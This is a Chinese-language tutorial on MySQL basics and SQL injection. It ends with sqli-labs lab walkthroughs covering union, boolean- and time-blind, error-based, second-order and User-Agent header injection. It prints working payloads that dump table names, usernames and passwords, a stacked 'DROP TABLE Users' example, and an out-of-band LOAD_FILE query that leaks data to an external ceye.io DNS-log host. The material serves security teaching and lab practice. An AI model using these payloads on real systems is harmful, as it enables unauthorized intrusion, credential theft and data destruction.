### MYSQL基础知识与SQL注入

#### 一、Mysql基础知识

##### 什么是数据库

通俗的说，数据库就是我们存放数据的地方，但是为什么我们需要数据库，而不是直接把数据普通的存储在电脑上，这是因为我们使用数据库之后，我们可以很方便的对数据进行管理。



#### **二、mysql的增删改查**

##### 数据库的创建删除与简单使用

###### **数据库的创建**

```mysql
create database [name];
eg:
create database test1;
```

<img src="https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428212500456.png" alt="image-20240428212500456" style="zoom:50%;" />

###### **数据库的删除**

```mysql
drop database [name];
例子
drop database test1
```

<img src="https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428212616969.png" alt="image-20240428212616969" style="zoom:50%;" />

###### **显示当前数据库名**

```mysql
SHOW DATABASES;
```

###### **创建表**

```mysql
create table student1(  #创建一个表，叫做student
id int primary key,   #创建一个整形id字段，  primary key  主键不为空且唯一
name  varchar(10),   #创建一个char类型name字段
age  int,    #创建一个整形age字段 
height  float,   # 创建一个浮点型 height字段
hobby  char(10),    #创建一个hobby char类型字段
address varchar(12)   #创建一个address 字符型
)default charset=utf8;    #默认编码UTF-8
```

###### **向表内添加数据**

```mysql
INSERT into student1 values(1,'admin',20,180,'swimming','五道口')
insert #插入
into  #到·····地方
student1 # 我们之前创建的表名
values()   #我们创建的字段里面填入值
```

![image-20240428212917512](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428212917512.png)

###### **修改表内数据**

```mysql
update student1 set address='八道口',hobby='play';
update #更新
student1 #表
set #设置
address='八道口',hobby='play' #字段值
```

**修改结果如下**：

![image-20240428213051861](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428213051861.png)

###### **条件修改**

```mysql
update student1 set address='猜我到底是几道口' where id=1 or name='admin';
updadte #更新
student1 #表名
set #设置
address='猜我到底是几道口'  #字段值
where id =1 or name ='admin'  #什么地方id=1 或者name='admin'
总体语句意思：更新student1这张表，把address这个字段的值改为’猜我到底是几道口‘ 并且这个地方需要id=1 或者 name ='admin'
```

**修改结果如下**

![image-20240428213320279](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428213320279.png)

###### **删除表内数据**

```mysql
delete from student1 where id=2 and address='五道口';
delete #删除
from  #什么地方 
where   #条件 id=2并且address=五道口
```

**执行结果如下**

![image-20240428213630457](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428213630457.png)

###### **一般查询**

```mysql
select [字段] from [表] = 库名.表名
select name from student1
```

**查询结果**

<img src="https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240428213813356.png" alt="image-20240428213813356" style="zoom:50%;" />

###### **条件查询**

```mysql
SELECT [字段] FROM [库名.表名] where 已知条件的字段名=“已知条件的值”
SELECT [字段] FROM [库名.表名] where 已知条件1的字段名=“已知条件1的值” AND 已知条件2的字段名=“已知条件2的值”
```



#### 三、mysql中与sql注入漏洞相关的知识点

在介绍SQL注入漏洞前，先介绍mysql中与sql注入漏洞相关的知识点

##### 1. information_schema数据库

Mysql 5.0版本之后，Mysql默认在数据库中存放一个名为“information_schema”的数据库。在这个数据库中，有三个重要的数据表：SCHEMATA 、TABLES、COLUMNS

**SCHEMATA**

存储用户创建的所有数据库的库名。其中记录数据库库名的字段为**SCHEMA_NAME**

**TABLES**

存储用户创建的所有数据库的库名和表名。其中记录数据库库名和表名的字段分别为：**TABLE_SCHEMA**和**TABLE_NAME**

**COLUMNS**

存储用户创建的所有数据库的库名、表名、字段名。其中记录数据库库名、表名、字段名的字段分别为：**table_schema、table_name、column_name**

##### 2. limit的用法

LIMIT子句可用于强制SELECT语句返回指定数量的记录。

limit的使用格式为limit m,n     其中m指记录开始的位置，m为0时表示从第一条记录开始读取；n指读取n条记录。例如

```mysql
SELECT * FROM table LIMIT 5,10;//检索记录行6-15。
```

##### 3.认识一些Mysql函数

length()：返回字符串的长度

substr(str,pos,num) ：截取指定位置指定长度的字符串

mid(str,pos,num) :截取指定位置指定长度的字符串

ascii() 查询ascii码中对应的值

char() 查询字符对应的ascii值

version() 当前MYSQL的版本

user() 当前的MYSQL用户

database() 当前网站使用的数据库

##### 4.mysql的注释符

1.从‘#'字符从行尾。

2.从‘-- '序列到行尾。请注意‘-- '(双破折号)注释风格要求第2个破折号后面至少跟一个空格符(例如空格、tab、换行符等等)。

3.从/*序列到后面的*/序列。结束序列不一定在同一行中，因此该语法允许注释跨越多行。

下面的例子显示了3种风格的注释：

//在mysql中如何写注释语句

```mysql
SELECT 1+1; # 这个注释直到该行结束

SELECT 1+1; -- 这个注释直到该行结束

SELECT 1 /* 这是一个在行中间的注释 */ + 1;

SELECT 1+
/*
这是一个
多行注释的形式
*/
1;
```

#### 四、SQL注入基础

##### 1.sql注入漏洞介绍

SQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的[SQL](https://so.csdn.net/so/search?q=SQL语句&spm=1001.2101.3001.7020)[语句](https://so.csdn.net/so/search?q=SQL语句&spm=1001.2101.3001.7020)来实现对数据库进行任意操作。

##### 2.sql注入的原理

sql注入漏洞的产生需要满足以下两个条件

- 参数用户可控：前端传给后端的参数内容是用户可以控制的
- 参数被带入数据库查询：传入的参数被拼接到SQL语句中，且被带入数据库中查询

当传入的参数ID为1’ 时，数据库执行的代码如下：

```mysql
select * from users where id = '1''
```

这不符合数据库语法规范，所以会报错。当传入的参数ID为 1 and 1=1时，执行的sql语句如下：

```mysql
select * from users where id = 1 and 1=1
```

此时，因为1=1为真，且where语句中id=1也为真，所以页面会返回与id=1相同的结果。当传入的参数ID为 1 and 1=2 时，因为1=2不成立，所以返回假，页面就会返回与id=1不同的结果。

由此可以初步判断参数ID存在SQL注入漏洞，攻击者可以进一步拼接SQL语句进行攻击，直到获取数据库信息，甚至进一步获取服务器权限等。

##### 3.sql注入的类型

union 联合注入

盲注（布尔型盲注、延时盲注）

堆叠注入

报错注入

带外数据注入

二次注入

http头注入

##### 4.union 联合注入

在SQL注入中，使用联合查询还可以获取其他表的数据。比如，应用程序中原本的查询逻辑是根据id 查询图书信息:

```mysql
SELECT name,author FROM Books WHERE id=123;
```

如果攻击者提交的 id 参数为:

```mysql
id=123 UNION SELECT username,password FROM Users
```

那么实际执行的 SQL 语句如下:

```mysql
SELECT name, author FROM Books WHERE id=123 UNION SELECT username, password FROM Users;
```

应用程序不仅返回了查询的图书信息，还会将Users 表中的所有账号及密码等信息一起返回给攻击者。

##### 5.堆叠注入

在有些场景中，应用程序支持一次执行多条SQL 语句，我们称之为堆叠查询(StackedQuernes)。如果应用程序存在 SQL 注入漏洞，攻击者可以在原有的 SQL 语句后添加新的 SQL语句，这种攻击就叫堆叠注入攻击，如:

```mysql
id=123; DROP TABLE Users;
```

在 Union 注入中能使用的 SQL语句类型是受限的，但是如果应用程序存在堆叠注入，攻击者就可以执行更多类型的SQL语句。例如，应用程序原本执行的是 SELECT语句，可以往其中注入INSERT 或 DROP 语句。

但是，堆叠注入并不是在所有环境下都可以用，它与应用程序使用的数据库有关系，而且也受 Web 开发语言和数据库中间件的限制，比如MySQL本身是支持堆叠查询的，但是PHP中最常用的 mysqli_query 函数就不支持堆叠查询。

##### 6.报错注入

在 SQL 注入的过程中，如果网站的 Web 服务器开启了错误回显，则会为攻击者提供极大的便利。比如，攻击者在参数中输入一个单引号‘，导致执行查询语句时发生语法错误，服务器返回了错误信息:

```mysql
You have an error in your SQl syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '123'' at line 1
```

从错误信息中可以知道，服务器用的是 MySQL 数据库，查询语句出错的单引号没有转义。错误回显披露了敏感信息，有了错误提示，对于攻击者来说，构造SQL注入的语句时就可以更加得心应手。

另外，部分数据库函数执行出错时会将参数内容添加到错误信息中，如UpdateXML、ExtractValue 等函数第二个参数必须是 XPath 格式，当其格式非法时，错误信息中会包含参数的内容，这样就可以将攻击者需要获取的信息从错误信息中显示出来。比如:

```mysql
id=1'and ExtractValue(l,concat(0x7e,database())) --  
```

其中 0x7e 表示字符“~”，它与数据库名拼接后一定是一个非法的 XPath 格式，此时如果开启了错误回显，输出的内容中将包含数据库名，内容如下:

```mysql
XPATH syntax error:~'database_name'
```

##### 7.盲注

现代 web应用在默认情况下大部分不会显示错误信息,所以攻击者需要使用“盲注”(BlindSOL Injection)技巧来探测其是否存在 SQL 注入漏洞。

所谓“盲注”，就是在服务器没有错误信息回显时完成注入攻击。服务器不显示错误信息对于攻击者来说就缺少了非常重要的“调试信息”,所以攻击者必须找到一个方法来验证注入的SOL 语句是否已被执行。

###### 7.1 布尔型盲注

最常见的盲注验证方法是，构造简单的条件语句，根据返回的页面是否发生变化，来判断SQL 语句是否被执行。比如，一个应用的 URL如下:

```http
http://example.com/item.php?id=2
```

执行的SQL语句为：

```mysql
select title,description,body from items where id = 2
```

如果攻击者构造如下条件语句:

```
http://example.com/item,php?id=2 AND 1=2
```

实际执行的 SQL语句就会变成:

```mysql
select title, description, body from items WHERE id = 2  AND 1=2
```

因为“AND 1=2”永远是一个假命题，所以这条 SQL语句的查询条件永远无法成立。web应用也不会将结果返回给用户，攻击者看到的页面结果将为空或者是一个出错页面。

但攻击者真正测试时看不到完整的SQL语句，为了进一步确认是否存在注入漏洞，攻击者还必须再次验证这个过程。因为应用程序内部的处理逻辑或安全过滤功能，攻击者构造的异常请求也可能会导致页面无法正常返回，仅通过这一次测试并不能确定应用程序是否存在SQL注入漏洞。攻击者继续构造如下请求:

```
http://example.com/item.php?id=2 AND 1=1
```

当攻击者构造条件“AND 1=1”时，如果页面正常返回，则说明SQL语句的“AND”条件成功执行，那么就可以判断“id”参数存在 SQL注入漏洞。攻击者也可以通过构造“OR 1=1’条件，让查询条件恒为真，如果服务端返回了大量数据，说明“id”参数存在 SQL注入漏洞。

在这个攻击过程中，服务端虽然关闭了错误回显，但是攻击者使用简单的条件判断语句，对比页面返回结果的差异，就可以判断是否存在SQL注入漏洞。这种攻击叫布尔型盲注，也叫基于条件响应的盲注，它不仅可用于探测是否存在注入漏洞，还能用于获取数据库中的其他信息。

在布尔型盲注中，存在注入漏洞不一定是体现在查询结果的不一致上，有时候在HTTP响应中的其他地方也会体现细微差异，如DOM 节点差异，可能需要通过多次尝试来验证。在自动化扫描器中，通常会通过响应内容的长度差异来判断是否存在注入漏洞。

###### 7.2 延时盲注

在上面的 SQL注入案例中，查询结果会影响页面的显示内容，但并不是所有应用场景都如此。如果查询结果仅仅用于应用程序的内部处理逻辑，并不影响页面的输出内容，那么布尔盲注就失效了，我们需要用其他的手段来探测应用程序是否存在 SQL注入漏洞。

在 Web应用中，查询数据库通常都是同步操作，即查询数据库的时间长短会影响请求的响应时间。在数据库中，有不少函数可以通过参数控制其执行时长。在mysql中，有一个BENCHMARK()函数，本来用来测试函数性能，他有两个参数：

BENCHMARK(COUNT,EXPR) 将表达式expr执行count次。比如：

```MYSQL
SELECT BENCHMARK(5000000,MD5(123)); #将md5(123)执行5000000次
```

上面语句将用时12秒左右。因此，利用该函数可以让同一个函数执行若干次，结果返回的时间比平时要长。我们通过时间长短的变化，可以判断注入的语句是否执行成功。

比如，我们在上面的例子中构造如下参数：

```mysql
123 or benchmark(5000000,md5(123));-- 
```

服务端的响应时间会比平时更长。改变执行次数可以影响响应时间，说明此处参数存在SQL注入。

这种通过执行一个耗时的函数来判断注入的SQL语句是否执行成功的攻击方式叫延时盲注。具体攻击方式与服务端使用的数据库类型有关系，在不同的数据库中有不同的方式来实现延时效果。

|   数据库   |                      延时方法                       |
| :--------: | :-------------------------------------------------: |
|   mysql    | benchmark(10000000,md5(123))/sleep(5)/get_lock(1,5) |
| postgresql |        pg_sleep(5)/generate_serise(1,100000)        |
| sql server |                waitfor delay ‘0:0:5’                |

##### 8.带外数据注入

所谓带外数据(Out-of-Band)，是指执行一项操作时通过额外的信道向外发送的数据，它可以用来判断目标应用是否存在SQL注入漏洞。但是我们后面会讲到，更多的时候是攻击者利用带外数据来向外传送特定内容。

如果 Web应用中的查询数据库操作是异步进行的，对它的注入操作不会直接反映在HTTP响应中，那么前面讲到的布尔型盲注和延时盲注就都不可用了。但是通过带外数据，我们可以构造特定的SQL语句让目标数据库通过网络向外发送数据，这种注入攻击就是带外数据注入。

**基础知识：**

1、认识Load_file函数

```
LOAD_FILE()  此函数用于文件的读取 
在读取文件时，文件的路径必须要写完整的文件路径 
使用此函数时，还要满足一些配置的要求：
Windows： 打开My.ini配置文件，做以下设置：
secure_file_priv=''
在默认情况下，Mysql是不允许进行数据的导入或导出操作
如果配置文件是如下配置：
secure_file_priv='/tmp'  表示限制Mysql只能在/tmp目录中执行导入导出操作，其它目录不能执行数据的导入导出 
所以我们不能限制文件的导入导出目录。
MYSQL配置文件修改后，需要重新启用mysql服务，并且查看Mysql的安全配置项，显示如下：
```

![image-20240724154543426](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240724154543426.png)

上述配置项设置完成后，可以在数据库中测试是否能访问本地的文件 

![image-20240724154624300](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240724154624300.png)

如果显示BLOB这个结果，说明文件是可以成功的读取。

在Windows中，文件的路径可以使用‘/’和‘\’,建议使用‘/‘,如果使用反斜杠，就要使用双反斜杠，也就是‘D:\\\test.txt’

------

2、认识UNC路径

UNC路径 通用命名规则，也称通用命名规范、通用命名约定。

什么是UNC路径？UNC路径就是类似 \hacker这样的形式的网络路径。它符合==\servername\sharename== 格式，其中 servername 是服务器名，sharename 是共享资源的名称。

```
\edu_pc\share_dir\bishe.pdf 
在edu_pc这台服务器下有一个share_dir目录，在此共享目录下面有一个文件bishe.pdf 
这种路径的表示方法就是UNC表示法 
在Windows中推荐使用这种写法：
//edu_pc/share_dir/bishe.pdf 
Linux不支持UNC路径，DNSlog注入不支持Linux环境 
```

3、CEYE.IO平台

![image-20240724155309909](https://gitee.com/zh0y0/picture/raw/master/zh0y0/image-20240724155309909.png)

在MySQL 中可以使用LOAD_FILE函数加载网络驱动器上的文件:

```mysql
SELECT LOAD_FILE('\\\\ydu4yt.ceye.io\\1.txt')
```

同样，该函数也会发起一次 DNS 查询。这种用法依赖MySQL 中一个名为 secure_file _priv的配置变量,它用于控制 MySQL 允许访问的文件路径。在旧的MySQL版本中,secure_file _priv 的值默认为空，即不做任何限制，所以在旧的 Web应用中,带外数据注入攻击成功的概率更,在新版本 MySQL 中，secure_file _priv的值默认是 NULL，即不允许访问目录。

##### 9.二次注入

前面讲到的SQL注入案例是 Web应用将用户的输入数据直接用于拼接SQL语句所导致的有时候，开发人员对外部数据做了严格的过滤，或采用了完善的SQL注入防御方案，但是在将应用程序内部的数据拼接到SQL语句中时，错误地认为内部数据都是可信的，而未采取相应的安全措施。

当用户提交的恶意数据被存入数据库后,应用程序再把它读取出来用于生成新的 SQL 语句时，如果没有相应的安全措施，还是有可能发生SQL注入，这种注入叫作二次SQL注入，也叫存储型 SQL 注入。

#### 五、实验

##### 1.sql-labs less-1  有回显的union 注入

###### 1.首先我们打开SQLlib的第一关

这里提示我们输入ID，并且是数值型

![8920cc29dcc805683529ad0ad6e423e](https://gitee.com/zh0y0/picture/raw/master/zh0y0/8920cc29dcc805683529ad0ad6e423e.png)

###### 2.第一步判断是否存在SQL注入

其实很简单，我们并不需要使用什么and 1=1 这样的语句去判断，而是可以直接输入一大堆垃圾数据，如果报错，那么说明我们输入的这个垃圾数据被带入数据库中并且执行了，那么就极有可能存在SQL注入

比如这里，我输入垃圾数据，明显看到报错了，那么就极有可能存在SQL注入

![ab5b1bd0191397017b93832df1867fb](https://gitee.com/zh0y0/picture/raw/master/zh0y0/ab5b1bd0191397017b93832df1867fb.png)

###### 3.判断闭合符号

输入单引号，报错，那么这里接收id的地方肯定是单引号

比如：

```mysql
select name from  users where id =' '
```

![1714316953139](https://gitee.com/zh0y0/picture/raw/master/zh0y0/1714316953139.jpg)

我们来分析一下为什么报错了，就确定他是单引号接收参数的，我们在数据库中执行下面这条语句，很明显，这是会报错的

```mysql
select name from student1 where id ='1''
```

![ef8696dae9cbd368cbe9c6047ee40f5](https://gitee.com/zh0y0/picture/raw/master/zh0y0/ef8696dae9cbd368cbe9c6047ee40f5.png)

那么执行这条语句，他会报错吗

```mysql
select name from student1 where id ='1"'
```

这里可能会出乎意料，他并没有报错，这里没有报错是因为我们的双引号不能和前后的单引号拼接起来，也就无法完成闭合，这个1"就会被当成参数去执行，而不是拼接成新的SQL语句

![505a93b38a497d6cc7315a849d629d2](https://gitee.com/zh0y0/picture/raw/master/zh0y0/505a93b38a497d6cc7315a849d629d2.png)

如果我们这里传入的是1'，那么拼接后的语句因该是这样的

```mysql
select name from student1 where id ='1'' 
```

这样的话明显我们输入的1'中的单引号就和前面的单引号给他闭合掉了，此时如果我们传入id的值为1' union select database()-- -  那么拼接后的语句为

```mysql
select name from student1 where id ='1' union select database()-- -' 
```

我们可以看到，这是可以执行成功的，这句的意思是查询id=1的字段，并且联合查询数据库的名字

![53e212bf926ac8f247294354894fb10](https://gitee.com/zh0y0/picture/raw/master/zh0y0/53e212bf926ac8f247294354894fb10.png)

这也就是SQL注入的原理，闭合掉原有的句子，来执行我们新的SQL语句

这里我们使用order by，那么order by 判断注入的点又是什么原理呢

我们执行下面这条语句

```mysql
select name,id from student1 where id ='1' order by 3
```

可以看到他报错了，这是为什么呢，因为order by 3 的意思是按照第3个列进行排序，但是我们这里明显可以看到，我们只查询了name和id这两个列的值，所以这里根本就不存在第三个列，也就会报错

![1dda9be26c1c5b3ed56a6f6b04be2d6](https://gitee.com/zh0y0/picture/raw/master/zh0y0/1dda9be26c1c5b3ed56a6f6b04be2d6.png)

所以这里无论我们是order by 2 还是 order by 1 他都不会报错，所以我们可以利用这个特性，从大的数字开始尝试，当不报错的那个数字出现了，那执行语句的时候就选择了那么多列，比如这里

```mysql
select name,id from student1 where id ='1' order by 2
```

可以看到order by 2的时候是没报错的，这正是因为我们select的时候刚好select了2列

![3c639baf3248a71af6215c1b445fa8d](https://gitee.com/zh0y0/picture/raw/master/zh0y0/3c639baf3248a71af6215c1b445fa8d.png)

###### 4.order by 语句判断字段个数

知道了这些前置知识之后，我们再来做这个题目就很简单了

```
http://192.168.191.138/sqli-labs-master/less-1/?id=1' order by 4 --+ 
```

![3e56f72e67eb3f03b09c22003a8d3c8](https://gitee.com/zh0y0/picture/raw/master/zh0y0/3e56f72e67eb3f03b09c22003a8d3c8.png)

这里报错，说明没有4列，那么试试3报错不报错

```
http://192.168.191.138/sqli-labs-master/less-1/?id=1' order by 3 --+ 
```

![676c728c406c5b008db7642cdfcebdc](https://gitee.com/zh0y0/picture/raw/master/zh0y0/676c728c406c5b008db7642cdfcebdc.png)

完美不报错，那么由此确定，在执行sql语句的时候只select了3列

###### 5.union select 判断回显点

看到这里的2和3这两个位置都是回显数据的，那么我们可以在这两个位置来查询数据，这里又有一个知识点，为什么要输入-1而不是1呢

```
http://192.168.191.138/sqli-labs-master/less-1/?id=-1' union select 1,2,3 --+
```

![84203ac0545f61cb10e1bccd7ab81b7](https://gitee.com/zh0y0/picture/raw/master/zh0y0/84203ac0545f61cb10e1bccd7ab81b7.png)

我们来解释一下为什么，我们来执行这条语句

```mysql
select name from student1 where id =1 union select database()
```

我们可以看到联合查询的时候，这个1也在name这个列，但是我们在注入的时候，需要的往往是那个union select的东西，而不是他原本的东西，如果说他原本的语句正常执行了，在页面回显的时候我联合查询的东西就会回显不出来，所以需要让第一个语句给他执行失败，像我们下面这样

![b5b2d47db32bf1768dcd894bd08e54a](https://gitee.com/zh0y0/picture/raw/master/zh0y0/b5b2d47db32bf1768dcd894bd08e54a.png)

我们执行下面这条语句，虽然前面的语句失败了，但是并不影响我们想要的结果，这样我们联合查询的结果就出来了，这也就是为什么联合查询的时候需要让他原本的语句出错的原因

```mysql
select name from student1 where id =11111 union select database()
```

![5ea89d9152b1cc9a75679c051c73202](https://gitee.com/zh0y0/picture/raw/master/zh0y0/5ea89d9152b1cc9a75679c051c73202.png)

###### 6.mysql相关说明

information_schema：表示所有信息，包括库、表、列

information_schema.tables：记录所有表名信息的表

information_schema.columns：记录所有列名信息的表

table_schema：数据库的名称

table_name:表名

column_name:列名

group_concat():显示所有查询到的数据

###### 7.查询表名

```mysql
http://192.168.191.138/sqli-labs-master/less-1/?id=-1'  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 
```

![270fb3d8332e53d6e3efbaa7de281c1](https://gitee.com/zh0y0/picture/raw/master/zh0y0/270fb3d8332e53d6e3efbaa7de281c1.png)

可以轻易看出这个users表是敏感的表，那么我们同样按照这种方法，拿到这个表中的列名

###### 8.查询列名

```
http://192.168.191.138/sqli-labs-master/less-1/?id=-1'  union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

![47190e0d474929d85bd819ed04291e0](https://gitee.com/zh0y0/picture/raw/master/zh0y0/47190e0d474929d85bd819ed04291e0.png)

这样我们就拿到了user表中的所有列名，其中username和password肯定是最敏感的，那么直接拿这两个数据

###### 9.查询数据

```
http://192.168.191.138/sqli-labs-master/less-1/?id=-1'  union select 1,username,password from security.users --+
```

![aa1b4328e65456506466122058a324b](https://gitee.com/zh0y0/picture/raw/master/zh0y0/aa1b4328e65456506466122058a324b.png)

可以看到执行成功，这个Dumb就是其中的一个账户密码了

###### 10.遍历所有数据

此时我们可以结合limit来遍历所有的字段值

```
http://192.168.191.138/sqli-labs-master/less-1/?id=-1'  union select 1,username,password from security.users limit 1,2 --+
```

![6c71a2a5ce34375b63fa853200293e8](https://gitee.com/zh0y0/picture/raw/master/zh0y0/6c71a2a5ce34375b63fa853200293e8.png)

这样我们就获得了第2行的值

数据库结构如下，同理可以遍历所有的

![5d04595a989d5c4113528a21a1a996b](https://gitee.com/zh0y0/picture/raw/master/zh0y0/5d04595a989d5c4113528a21a1a996b.png)

##### 2.sql-labs less-8  布尔盲注

###### 1.判断正确页面与错误页面

正常页面回显样子为：

?id=1’ and 1=1--+

(利用and同时为真才返回true，or同时为假才返回false)

![eb959d52025d72fb15a9f36dde049c6](https://gitee.com/zh0y0/picture/raw/master/zh0y0/eb959d52025d72fb15a9f36dde049c6.png)

查看语句错误时的回显页面样子：

通过闭合多余的单引号从而使添加进去的sql语句正确执行

?id=1' and 1=2

![8be54f5564e9221a020409305e5e35b](https://gitee.com/zh0y0/picture/raw/master/zh0y0/8be54f5564e9221a020409305e5e35b.png)

###### 2.查询数据库长度

输入以下语句去猜数据库长度，or同时为假返回false

```
?id=0' or length(database())>7--+    true
?id=0' or length(database())>8--+    false
?id=0' or length(database())=8--+    true
```

![6c069f3f6396e60a0367f79444389c2](https://gitee.com/zh0y0/picture/raw/master/zh0y0/6c069f3f6396e60a0367f79444389c2.png)

###### 3.猜数据库第一位字符

可以先用substr函数取数据库的第一位字符，然后为了方便匹配我们将拿到的第一个字符转换成对应的ASCII值，再与猜测的ASCII值进行大小比较。通过修改substr的参数逐步得到该数据库的第二位字符第三位字符……最终得到数据库全名为security

```
?id=0' or ascii(substr(database(),1,1))>100--+  true
?id=0' or ascii(substr(database(),1,1))>120--+  false
?id=0' or ascii(substr(database(),1,1))=115--+  true
```

###### 4.猜测数据库中的表数量

测试 or 4 = 正常 、or 5 = 失败

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or 4=(select count(table_name) from information_schema.tables where table_schema=database());--+
```

![99f0a625e7c0ff182c208feb58ffd41](https://gitee.com/zh0y0/picture/raw/master/zh0y0/99f0a625e7c0ff182c208feb58ffd41.png)

###### 5.猜测第一个表中的第一个字符

查找security这个数据库中的第一个表中（用limit控制输出第一个表名）的第一个字符对应的ASCII值

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101--+
```

![5c80501ca97a70e575232460152d395](https://gitee.com/zh0y0/picture/raw/master/zh0y0/5c80501ca97a70e575232460152d395.png)

###### 6.猜测字段长度

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or (select count(column_name) from information_schema.columns where table_schema=database() and table_name='emails')=2--+
```

![47ae0440e5416be214029ea0b221806](https://gitee.com/zh0y0/picture/raw/master/zh0y0/47ae0440e5416be214029ea0b221806.png)

###### 7.查第一个字段全名

通过上一步逐步猜解security数据库中第一个表的全名，最终得到第一个表的表名为emails。然后要猜测emails这个表中的第一个字段的第一个字符，逐步猜测最终得到第一个字段的名字为id。不断改变ASCII的比较值来确定字段名中的字符。

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),1,1))>104--+
```

![e56d620951ffd9360942f46ad62f125](https://gitee.com/zh0y0/picture/raw/master/zh0y0/e56d620951ffd9360942f46ad62f125.png)

###### 8.猜测表中字段具体内容的条数

在上面步骤中已经知道了数据库名和表名，所以在下面命令中可以直接写出

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or 8=(select count(id) from security.emails)--+
```

![65b11129c08162dfcf7fb354fb0eb78](https://gitee.com/zh0y0/picture/raw/master/zh0y0/65b11129c08162dfcf7fb354fb0eb78.png)

###### 9.查询字段的第一条具体内容

```
http://192.168.191.138/sqli-labs-master/less-8/?id=0' or ascii(substr((select email_id from security.emails limit 0,1),1,1))=68--+
```

![677df7abc8b4220d9bbee4bbb9bc6f7](https://gitee.com/zh0y0/picture/raw/master/zh0y0/677df7abc8b4220d9bbee4bbb9bc6f7.png)

##### 3.sql-labs less-9  时间盲注

###### 1.判断是否为时间盲注

```
?id=1' and sleep(5) --+
```

###### 2.插入if条件语句看是否执行了时间延迟，获取数据库长度

```
?id=1' and if(length(database())=8,sleep(5),0)--+
```

后面步骤类似于布尔盲注

##### 4.sql-labs Less-5 基于报错盲注

extractvalue报错注入

extractvalue(XML_document,XPath_string)
 	   参数1：XML_document是String格式，为XML文档对象的名称
		参数2：XPath_string(Xpath格式的字符串)
 	   作用：从目标XML中返回所查询值的字符串

extractvalue函数接收两个字符串参数，一个属xml标记片段和xpath表达式xpath expr（xml是一种可扩展标记语言，使用标签来操作，html就是一种常见的标记型语言，xml主要用来存储数据，体现在作配置文件，或者充当小型数据库，在网络中传输数据，类似与HTML语言中的div标签；）（xpath expr 也称为定位器，也就是路径查询，因为咱们主要是为了学习sql注入，所有函数的原理不用太纠结，只要大概了解一下就行了）

**其实简单点来说，第一个参数就是为了上传一个xml文档，第二个参数就是用xpath路径法查找路径，extractvalue报错注入 就是通过在函数中写如不符合语法格式的xpath达到报错的目的，并且通过拼接sql注入语句从而通过报错查询并显示我们想要查询的内容；**

用法：

```
and extractvalue(1,concat(0x7e,(联合语句),0x7e))
```

可以理解对我们的后台数据库进行一个xml文档的故意报错

```
?id=1' and extractvalue(1,concat('~',(select database()),'~'))  --+
```

![1f09461c38ca658b50d1002326200e8](https://gitee.com/zh0y0/picture/raw/master/zh0y0/1f09461c38ca658b50d1002326200e8.png)

##### 5.sql-labs less-24 二次注入

第二十四关有一个登录页面和注册页面还要一个修改密码页面，该关卡使用得是二次注入，因为登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义。这里我们利用的是注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。

![f75f651e67287255eb5115fc367ec2c](https://gitee.com/zh0y0/picture/raw/master/zh0y0/f75f651e67287255eb5115fc367ec2c.png)

###### 1.注册新的用户

首先我们看到管理员账户，admin，密码是admin,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。我们先注册一个账号名叫admin'#  密码123456

![8d9fb3efcc3f7ad2b8cf884cae890dd](https://gitee.com/zh0y0/picture/raw/master/zh0y0/8d9fb3efcc3f7ad2b8cf884cae890dd.png)

可以看到我们成功将有污染的数据写入数据库。单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。

###### 2.修改新用户密码

之后也用户名admin'#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是456789，可以看到密码修改成功。

![129451bc3fa266eb171d923bc59d194](https://gitee.com/zh0y0/picture/raw/master/zh0y0/129451bc3fa266eb171d923bc59d194.png)

![091a53923fc9af4d5684baf17379b72](https://gitee.com/zh0y0/picture/raw/master/zh0y0/091a53923fc9af4d5684baf17379b72.png)

当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。

![c8e38a5f3d9274f8d7b2532e278f651](https://gitee.com/zh0y0/picture/raw/master/zh0y0/c8e38a5f3d9274f8d7b2532e278f651.png)

##### 6.sql-labs less-18 useragent头注入

###### 1.输入正确的账号密码

这关可以直接看到页面有一个ip，我们 可以简单看一下源码，发现对于输入的账户名和密码都有进行检查，但是往下看会发现一个插入的sql语句，当我们输入正确的账户名和密码我们的User-Agent字段内容就会出现在页面上

![4dedd7bd926853d5ac63d56eecd2b19](https://gitee.com/zh0y0/picture/raw/master/zh0y0/4dedd7bd926853d5ac63d56eecd2b19.png)

###### 2.抓包修改user agent内容

点击提交按钮，抓取请求数据包，对useragent头进行修改，查看返回包数据，发现mysql的错误提示

![e035d08b6fa922cc14d7d4da31d450c](https://gitee.com/zh0y0/picture/raw/master/zh0y0/e035d08b6fa922cc14d7d4da31d450c.png)

###### 3.查看源码

当我们在User-Agent后面加上单引号出现如下报错，可见插入语句是将ua字段内容和ip地址以及账户名作为字符串进行插入且外面有括号。还要注意该插入语句需要三个参数，所以我们在构造时候也需要有三个参数。因为#号后面都被注释了。

![1cff88c15d9b4f738f4a7ce04aeb798](https://gitee.com/zh0y0/picture/raw/master/zh0y0/1cff88c15d9b4f738f4a7ce04aeb798.png)

